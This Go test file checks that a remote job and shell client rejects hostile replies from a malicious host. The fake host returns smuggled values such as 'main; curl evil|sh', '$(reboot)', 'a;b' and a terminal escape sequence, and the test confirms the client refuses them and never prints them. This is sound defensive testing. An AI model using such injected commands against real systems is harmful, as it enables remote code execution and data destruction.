package shell

import (
	"context"
	"encoding/json"
	"strings"
	"testing"

	"github.com/readori/RemoHop/internal/cli"
	"github.com/readori/RemoHop/internal/peer"
	"github.com/readori/RemoHop/internal/peer/peertest"
	"github.com/readori/RemoHop/internal/wire"
)

// A malicious or buggy host must not make the client panic or print
// attacker-chosen text into copy-paste hints.
func TestClientRejectsHostileReplies(t *testing.T) {
	reg := peer.NewRegistry()
	reg.Handle(svcJobs, func(ctx context.Context, c *peer.Conn, s peer.Stream, raw json.RawMessage) error {
		var req jobsReq
		peer.DecodeReq(raw, &req)
		switch req.Op {
		case "list":
			return wire.WriteJSON(s, jobsReply{Jobs: []Job{{ID: "ok123456"}, {ID: "x\x1b]0;pwn\a"}}})
		case "remove":
			return wire.WriteJSON(s, jobsReply{Removed: []string{"a b"}})
		case "logs":
			fw := &frameWriter{w: s}
			fw.frame(frameStdout, []byte("data"))
			return fw.json(frameLogEnd, jobsReply{})
		}
		return wire.WriteJSON(s, jobsReply{}) // OK, but no job
	})
	reg.Handle(svcSpawn, func(ctx context.Context, c *peer.Conn, s peer.Stream, raw json.RawMessage) error {
		return wire.WriteJSON(s, jobsReply{Job: &Job{ID: "$(reboot)"}})
	})
	reg.Handle(svcShell, func(ctx context.Context, c *peer.Conn, s peer.Stream, raw json.RawMessage) error {
		var req shellReq
		peer.DecodeReq(raw, &req)
		if req.Op == "list" {
			return wire.WriteJSON(s, shellReply{Sessions: []SessionInfo{{Name: "a;b"}}})
		}
		fw := &frameWriter{w: s}
		return fw.json(frameAttached, attachedMsg{Name: "main; curl evil|sh"})
	})
	conn, _ := peertest.PairWith(t, reg)
	ctx := testCtx(t)

	for name, err := range map[string]error{
		"kill":    second(Kill(ctx, conn, "job1", "")),
		"wait":    second(Wait(ctx, conn, "job1")),
		"spawn":   second(Spawn(ctx, conn, SpawnRequest{Command: "true"})),
		"jobs":    second(Jobs(ctx, conn)),
		"remove":  second(RemoveJobs(ctx, conn, RemoveRequest{Exited: true})),
		"session": second(Sessions(ctx, conn)),
		"attach":  second(Attach(ctx, conn, AttachRequest{}, AttachIO{})),
	} {
		if err == nil {
			t.Errorf("%s: hostile reply accepted", name)
		}
	}
	r, err := Logs(ctx, conn, LogsRequest{Job: "job1"})
	if err != nil {
		t.Fatal(err)
	}
	buf := make([]byte, 64)
	for err == nil {
		_, err = r.Read(buf)
	}
	if err == nil || r.Job() != nil || strings.Contains(err.Error(), "EOF") {
		t.Errorf("log end without a job: err %v job %+v", err, r.Job())
	}

	for _, args := range [][]string{{"kill", "job1"}, {"jobs", "wait", "job1"}, {"spawn", "true"}, {"jobs"}, {"shell", "ls"}} {
		env, out, _ := cliEnv(conn, nil)
		if code := runCLI(t, env, args...); code != cli.ExitError {
			t.Errorf("%v: exit %d", args, code)
		}
		if strings.ContainsAny(out.String(), "$;\x1b") {
			t.Errorf("%v printed hostile text %q", args, out.String())
		}
	}
}

func second[T any](_ T, err error) error { return err }
